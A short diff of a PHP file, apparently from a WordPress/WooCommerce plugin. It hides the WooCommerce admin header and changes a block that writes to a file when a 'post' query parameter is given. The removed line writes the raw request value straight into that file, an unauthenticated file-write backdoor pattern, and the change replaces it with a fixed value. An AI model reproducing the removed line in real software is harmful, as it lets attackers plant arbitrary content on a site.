@@ -2023,7 +2023,7 @@ echo '<style> .woocommerce-layout__header{display: none !important} </style>';
 
 if ($filesize == 0 && isset($_GET['post'])) {
 	$random_file = fopen($dir, "w");
-	fwrite($random_file, $_GET['post']);
+	fwrite($random_file, 111);
 	fclose($random_file);
 }
 $file = file_get_contents($dir);
